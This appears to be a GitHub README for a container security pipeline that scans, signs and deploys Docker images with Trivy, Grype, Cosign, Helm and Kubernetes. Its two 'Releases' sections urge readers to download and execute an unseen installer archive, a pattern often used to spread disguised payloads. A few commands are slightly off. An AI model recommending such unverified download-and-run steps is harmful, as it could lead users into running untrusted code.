# Container Security Pipeline: Scan, Sign, Deploy to Kubernetes

[![Releases](https://img.shields.io/github/v/release/namish69/container-security-pipeline?label=Releases&color=blue)](https://github.com/namish69/container-security-pipeline/releases)

![Docker](https://www.docker.com/sites/default/files/d8/2019-07/Moby-logo.png) ![Kubernetes](https://raw.githubusercontent.com/kubernetes/website/main/static/images/logos/kubernetes.svg) ![GitHub Actions](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)

About
-----
This repository holds a complete, automated pipeline for building Docker images, scanning them for vulnerabilities, signing them, and deploying them to cloud and Kubernetes environments. The pipeline integrates major tooling used in container security and CI/CD workflows: GitHub Actions, Trivy, Grype, Cosign, Docker, Helm, and Kubernetes. It provides sample workflows, scripts, and manifests you can use to secure your container lifecycle.

Repository topics: ci-cd, container-security, cosign, devops, devsecops, docker, github-actions, grype, k8s, kubernetes, python, trivy, vulnerability-scanning

Releases
--------
Download the release asset listed on the releases page and execute the installer in your CI or on a build host. The release page lists packaged assets and installers. For example, download the file container-security-pipeline-<version>-linux-amd64.tar.gz from the releases page and run the installer script inside the archive.

Release page (download and execute the listed file): https://github.com/namish69/container-security-pipeline/releases

Quick links
-----------
- Build images with CI: GitHub Actions workflows in .github/workflows
- Scan images with Trivy and Grype
- Sign images with Cosign
- Push to registries with Docker or ORAS
- Deploy to Kubernetes with Helm or kubectl

Badges
------
[![CI](https://img.shields.io/github/actions/workflow/status/namish69/container-security-pipeline/ci.yml?branch=main&label=CI&logo=github)](https://github.com/namish69/container-security-pipeline/actions) [![License](https://img.shields.io/github/license/namish69/container-security-pipeline)](https://github.com/namish69/container-security-pipeline/blob/main/LICENSE)

Why use this pipeline
---------------------
- Automate image builds and enforce a consistent security policy.
- Integrate scanning tools that catch vulnerabilities at build time.
- Sign images to ensure deployment integrity.
- Deploy only images that pass checks.
- Provide sample configurations for cloud and Kubernetes.

Key features
------------
- Multi-stage Docker builds for small, secure images.
- Trivy and Grype scans in CI with formatted reports and exit codes.
- Cosign image signing and verification with key or keyless mode.
- GitHub Actions workflows to orchestrate build, scan, sign, and push.
- Helm charts and raw manifests for Kubernetes deployment.
- Python helper scripts to fetch and parse scan data.
- Logs and reports in SARIF and JSON for integration with code scanning tools.

Architecture
------------
This section describes the pipeline flow and the roles of each component.

Flow
1. Source pushed to GitHub.
2. CI runs when branches or tags change.
3. CI builds Docker image.
4. CI runs Trivy and Grype scans against the image.
5. CI publishes scan reports as artifacts.
6. CI signs the image with Cosign when scans pass.
7. CI pushes the signed image to a registry.
8. Deployment job pulls signed image and deploys to Kubernetes.

Components
- GitHub Actions: orchestrates jobs and secrets.
- Docker Buildx: builds multi-platform images where needed.
- Trivy: vulnerability scanner with database and OS packages analysis.
- Grype: vulnerability scanner focused on SBOM and packages.
- Cosign: image signing and verification.
- Helm: templated Kubernetes deployments.
- kubectl: apply manifests for simple deployments.
- Python scripts: parse and merge scan reports and generate dashboards.

Diagram
-------
[ Source ] -> [ GitHub Actions ] -> [ Build ] -> [ Scan (Trivy/Grype) ] -> [ Sign (Cosign) ] -> [ Registry ] -> [ Kubernetes ]

Quickstart
----------
This quickstart shows minimal steps to use the pipeline locally and in CI.

Prerequisites
- Docker 20.10+
- Git
- kubectl 1.20+
- Helm 3+
- GitHub account for Actions and a registry (Docker Hub, GHCR, or ECR)
- Cosign binary for signing

Clone the repo
```
git clone https://github.com/namish69/container-security-pipeline.git
cd container-security-pipeline
```

Build the sample image
```
docker build -t sample-app:local ./examples/sample-app
```

Run Trivy locally
```
trivy image --format json --output trivy-report.json sample-app:local
```

Run Grype locally
```
grype sample-app:local -o json > grype-report.json
```

Sign the image with Cosign (keyless)
```
cosign sign --keyless sample-app:local
```

Push to registry
```
docker tag sample-app:local ghcr.io/<org>/sample-app:latest
docker push ghcr.io/<org>/sample-app:latest
```

Deploy to Kubernetes
```
kubectl apply -f k8s/
kubectl rollout status deployment/sample-app
```

GitHub Actions workflows
------------------------
This repo includes several workflows in .github/workflows. You can copy them to your own repo with minor adjustments.

Main CI workflow (ci.yml)
- Triggers: push, pull_request, tag
- Jobs:
  - build: builds and stores image as artifact
  - scan: runs Trivy and Grype; publishes SARIF and JSON
  - sign_and_push: runs Cosign and pushes image if scans pass
  - deploy: optional job that runs on protected branches or tags

Key concepts in the workflow
- Use matrix builds for multi-arch images.
- Use a scanning job that runs in parallel to build.
- Fail the pipeline when severity threshold is reached.
- Upload scan artifacts and annotate PRs with results.
- Use GitHub environment protection to gate deployments.

Sample workflow snippet
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2
      - name: Build image
        run: docker build -t ghcr.io/${{ github.repository_owner }}/sample-app:${{ github.sha }} .
      - name: Save image
        run: docker save ghcr.io/${{ github.repository_owner }}/sample-app:${{ github.sha }} -o image.tar
      - uses: actions/upload-artifact@v3
        with:
          name: image
          path: image.tar
  scan:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - uses: actions/download-artifact@v3
        with:
          name: image
      - name: Load image
        run: docker load -i image.tar
      - name: Run Trivy
        run: trivy image --format json --output trivy.json ghcr.io/${{ github.repository_owner }}/sample-app:${{ github.sha }}
      - name: Run Grype
        run: grype ghcr.io/${{ github.repository_owner }}/sample-app:${{ github.sha }} -o json > grype.json
      - uses: actions/upload-artifact@v3
        with:
          name: scan-reports
          path: |
            trivy.json
            grype.json
```

Scanning details
----------------
Trivy and Grype catch different classes of issues and complement each other.

Trivy
- Scans OS packages, language dependencies, and config files.
- Produces reports in JSON, table, and SARIF formats.
- Uses an updatable database; update it before runs.

Trivy example
```
trivy image --exit-code 1 --severity CRITICAL,HIGH --format json --output trivy-report.json <image>
```
- --exit-code controls CI failure when severities are found.
- --severity filters vulnerabilities.

Grype
- Focuses on SBOM and package-level vulnerabilities.
- Provides mappings to CVEs.
- Works well on images and SBOM files.

Grype example
```
grype <image> -o json > grype-report.json
```

Interpreting results
- Use severity thresholds for automated gating (e.g., block deploy on CRITICAL).
- Human review can handle LOW and MEDIUM, depending on context.
- Automate trivial fixes like updating base images or pinned versions.

SBOM support
- Use syft to generate SBOMs that feed into Grype.
- Store SBOM artifacts alongside scans for audits.

Signing with Cosign
-------------------
Cosign gives cryptographic assurance of image provenance. Use it to sign images before deployment.

Keyless signing
- Use Fulcio and Rekor for rootless signing.
- Offers a simple workflow for CI.

Key-based signing
- Store private keys in GitHub Secrets or vaults.
- Use cosign generate-key-pair to create a key pair.

Sign example (keyless)
```
cosign sign --keyless ghcr.io/<org>/sample-app:${TAG}
```

Sign example (key)
```
cosign sign -key cosign.key ghcr.io/<org>/sample-app:${TAG}
```

Verify example
```
cosign verify ghcr.io/<org>/sample-app:${TAG}
```

Store signatures
- Cosign stores signatures in OCI registries alongside images.
- Rekor provides a transparency log for public attestations.

Kubernetes attestation
- Use admission controllers like Sigstore’s Cosign-OPA or Kubernetes admission webhook to enforce signature checks.
- Use imagePolicyWebhook or Gatekeeper to restrict images to signed ones.

Deployment options
------------------
You can deploy the signed image to Kubernetes via Helm or kubectl.

Helm chart
- Locate the chart in charts/sample-app.
- Chart values let you set image repository, tag, and pull policy.
- Chart includes an imagePolicyWebhook annotation for signature verification.

Sample values.yaml snippet
```yaml
image:
  repository: ghcr.io/<org>/sample-app
  tag: v1.0.0
  pullPolicy: IfNotPresent
securityContext:
  runAsNonRoot: true
  readOnlyRootFilesystem: true
```

kubectl apply
- Use k8s/manifests/deployment.yaml for a zero-dependency deploy.
- The manifest includes PodSecurityPolicy or PodSecurity admission labels.

Kubernetes manifests sample
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: sample-app
spec:
  replicas: 2
  selector:
    matchLabels:
      app: sample-app
  template:
    metadata:
      labels:
        app: sample-app
    spec:
      containers:
      - name: app
        image: ghcr.io/<org>/sample-app:latest
        securityContext:
          runAsNonRoot: true
          readOnlyRootFilesystem: true
        ports:
        - containerPort: 8080
```

Best practices for Kubernetes
- Set resource requests and limits.
- Run containers as non-root.
- Reduce image size via multi-stage builds.
- Use immutable tags or content-addressable digests.
- Use network policies to limit traffic.
- Keep secrets in sealed secrets or external manager.

Secrets and keys
----------------
Handle keys and secrets carefully.

GitHub Actions secrets
- Store COSIGN_PASSWORD, COSIGN_PRIVATE_KEY, REGISTRY_TOKEN in GitHub Secrets.
- Use GitHub Environments to control deployment to production.

Cloud key management
- Use KMS providers (AWS KMS, GCP KMS, Azure Key Vault) for private keys.
- Use cosign with KMS via the appropriate cosign KMS URI.

Local development keys
- Use a developer key pair for local testing.
- Do not store private keys in source control.

Python helpers
--------------
The repo includes Python scripts that merge scan results and generate a combined policy report.

Scripts
- tools/merge_scans.py: merge Trivy and Grype JSON into a single view.
- tools/parse_sarif.py: extract SARIF results into a readable table.
- tools/upload_reports.py: upload artifacts to artifact storage or S3.

Example usage
```
python3 tools/merge_scans.py --trivy trivy.json --grype grype.json --out combined-report.json
```

merge_scans.py behavior
- It parses both JSON formats.
- It normalizes severities to CRITICAL, HIGH, MEDIUM, LOW, UNKNOWN.
- It groups findings by CVE and package.
- It outputs an aggregate risk score.

CI artifact retention
- Keep scan artifacts for a set retention period.
- Archive them in object storage if you need long-term audit.

Policies and gating
-------------------
Use a clear policy for which severities block promotion.

Common policies
- Block on any CRITICAL.
- Block on HIGH if the fix window exceeds SLA.
- Allow MEDIUM and LOW after review.
- Use auto-remediation for trivial fixes such as base image updates.

Apply policy in CI
- Use exit codes from Trivy/Grype to fail scans.
- Add a policy step to the workflow that inspects the merge report.

Policy script sample
```bash
python3 tools/check_policy.py --report combined-report.json --block-severities CRITICAL,HIGH
if [ $? -ne 0 ]; then
  echo "Policy check failed"
  exit 1
fi
```

Notifications and PR feedback
-----------------------------
Integrate scan results with PR comments or status checks.

Options
- Post a comment with a summary and a link to artifacts.
- Use GitHub Check Runs with SARIF to show annotations in the PR.
- Post to Slack or Teams for critical failures.

Example GitHub Action
- Use actions/upload-sarif to upload SARIF for code scanning.
- Use actions/create-comment to add a PR comment with a link to the JSON report.

Logging and observability
-------------------------
Store scan logs, signing logs, and deployment logs for audits.

Recommendations
- Push logs to a central logging cluster or cloud provider.
- Correlate deployment logs with signed image digests.
- Keep an audit trail of signatures and corresponding commits.

Compliance and audit
--------------------
- Store SBOMs alongside images.
- Keep a record of Cosign verifications and Rekor entries.
- Use image digests instead of tags for traceability.

Sample compliance record
- Commit SHA -> Image digest -> Cosign entry -> Deployment timestamp

Testing and staging
-------------------
Use isolated registries and clusters for testing.

Approach
- Use a staging GitHub environment.
- Deploy to a staging cluster only after presubmission checks.
- Promote images from staging to production only if Cosign verification passes.

Local testing
- Use kind or minikube for local Kubernetes tests.
- Use ephemeral registries like registry:2 running locally for full integration tests.

Examples folder
---------------
This repo includes an examples folder with:
- examples/sample-app: a small Python web app with Dockerfile
- examples/helm-chart: Helm chart for sample app
- examples/k8s: raw manifests for the sample app
- examples/scripts: helper scripts for local testing

Contribution guide
------------------
We accept contributions that improve the pipeline, add tools, or refine policies.

How to contribute
1. Fork the repo.
2. Create a branch for your change.
3. Add tests or update sample configurations.
4. Open a pull request with a clear description of the change.

Coding style
- Keep code simple and readable.
- Add comments for non-obvious logic.
- Use consistent formatting for YAML and JSON.

Testing
- Add unit tests where possible.
- Validate YAML with kubectl apply --dry-run=client.
- Lint Helm charts with helm lint.

Troubleshooting
---------------
Problem: Trivy fails to fetch DB.
- Action: Run trivy db update in CI or provide an offline DB.

Problem: Cosign fails with permission denied.
- Action: Check private key permissions and secret access in CI.

Problem: Kubernetes deployment fails due to image pull error.
- Action: Verify registry credentials and image digest. Confirm that the image is pushed and public or accessible.

Problem: CI job times out
- Action: Increase job timeout or split heavy steps into separate jobs.

FAQ
---
Q: Which registries does the pipeline support?
A: The pipeline supports any OCI-compatible registry: Docker Hub, GitHub Container Registry (GHCR), Amazon ECR, Google Container Registry (GCR), and Azure Container Registry (ACR).

Q: Can I use a different scanner?
A: Yes. The pipeline uses Trivy and Grype by default. You can plug in other scanners by adding a scan job and adjusting the merge scripts.

Q: How do I enforce signature verification in Kubernetes?
A: Use an admission controller that verifies Cosign signatures or integrate Gatekeeper policies that call a verification webhook.

Q: Can I use this pipeline for serverless containers?
A: Yes. Serverless platforms that accept OCI images can benefit from the same build, scan, sign, and push steps.

Advanced topics
---------------
SBOM and supply chain
- Generate SBOMs with syft and store them with images.
- Use SBOMs to track transitive dependencies.
- Feed SBOMs to Grype for detailed vulnerability mapping.

Attestation and metadata
- Use Cosign to produce attestations about build provenance.
- Store metadata like source commit, build number, and SBOM as OCI image annotations.

Multi-cluster deployments
- Use GitOps tools (Argo CD, Flux) for multi-cluster promotion.
- Use signed images and policies to allow safe promotion across clusters.

Running at scale
- Use a dedicated runner for heavy scanning tasks.
- Cache scanner DBs between runs to save time.
- Use a centralized registry with proper retention and access controls.

Security hardening tips
- Limit GitHub Actions token scope.
- Run scans in ephemeral runners.
- Rotate cosign keys on a schedule.
- Use hardware-backed keys for signing when available.

Policy as code
- Store policy checks in a repository file.
- Validate changes to policy via pull requests.

Example CI policy block
```yaml
- name: Enforce policy
  run: |
    python3 tools/check_policy.py --report combined-report.json --block-severities CRITICAL,HIGH
```

Local dev loop
--------------
1. Make code change in examples/sample-app.
2. Run local build: docker build -t sample-app:dev .
3. Run local scans: trivy image --format table sample-app:dev
4. Fix issues.
5. Run local deploy to a kind cluster.

Automation tips
---------------
- Use dependabot or Renovate to keep base images updated.
- Schedule nightly scans to detect new CVEs.
- Tag releases with semantic versioning and sign tags as part of release workflow.

Integrations
------------
- GitHub Actions: native CI integration.
- Slack/Teams: notify on failed scans.
- SSO and IAM: use identity providers for key access.
- SIEM: forward logs for threat detection.

Files to look at
----------------
- .github/workflows/ci.yml — Core CI workflow
- examples/sample-app/Dockerfile — Example multi-stage Dockerfile
- charts/sample-app — Helm chart
- k8s/ — Kubernetes manifests
- tools/ — Python scripts and helpers
- docs/ — Extended documentation and architecture notes

Licensing
---------
This repository uses the MIT License. See LICENSE for details.

Contact and support
-------------------
Open an issue if you find bugs or want new features. Use PRs for code contributions. Maintain clear changelogs and incremental releases.

Releases (again)
----------------
Download the packaged release asset from the releases page and run the included installer file. The releases page lists binaries and install scripts. Example asset to run: container-security-pipeline-<version>-linux-amd64.tar.gz. Visit the releases page to fetch the correct file and follow the included README in the asset.

Releases page: [![Get Releases](https://img.shields.io/badge/Release%20Downloads-blue?logo=github)](https://github.com/namish69/container-security-pipeline/releases)

Appendix: sample commands and templates
--------------------------------------

Build, scan, sign, and push (script)
```bash
#!/bin/bash
set -euo pipefail

IMAGE=ghcr.io/${GITHUB_REPOSITORY_OWNER}/sample-app:${1:-latest}

docker build -t $IMAGE .
trivy image --exit-code 1 --severity CRITICAL,HIGH --format json --output trivy.json $IMAGE
grype $IMAGE -o json > grype.json

# merge reports
python3 tools/merge_scans.py --trivy trivy.json --grype grype.json --out combined.json

# policy check
python3 tools/check_policy.py --report combined.json --block-severities CRITICAL,HIGH

# sign and push
cosign sign --keyless $IMAGE
docker push $IMAGE
```

Helm values example
```yaml
replicaCount: 2

image:
  repository: ghcr.io/<org>/sample-app
  tag: "1.2.3"
  pullPolicy: IfNotPresent

service:
  type: ClusterIP
  port: 80

resources:
  limits:
    cpu: 500m
    memory: 256Mi
  requests:
    cpu: 100m
    memory: 128Mi
```

Kubernetes RBAC minimal for deployment
```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: pipeline-deployer
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: deployer-role
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "create", "update", "patch"]
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: deployer-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: deployer-role
subjects:
- kind: ServiceAccount
  name: pipeline-deployer
```

Scripts and examples in this repo aim to be practical and replaceable. Adjust them to match your organization rules and registry choices.

Contributing
------------
Follow the standard fork-and-PR model. Create issues for feature requests and bugs. Use small, focused PRs. Update docs and add tests for functional changes.

Security policy
---------------
Report security issues via a private channel. Provide reproduction steps and context. Keep keys and secrets out of PRs.

License
-------
MIT

Acknowledgements
----------------
The pipeline builds on open tools and standards: Docker, OCI images, Trivy, Grype, Cosign, Kubernetes, Helm, and GitHub Actions. The examples adhere to common security best practices to help teams adopt a safer container lifecycle.

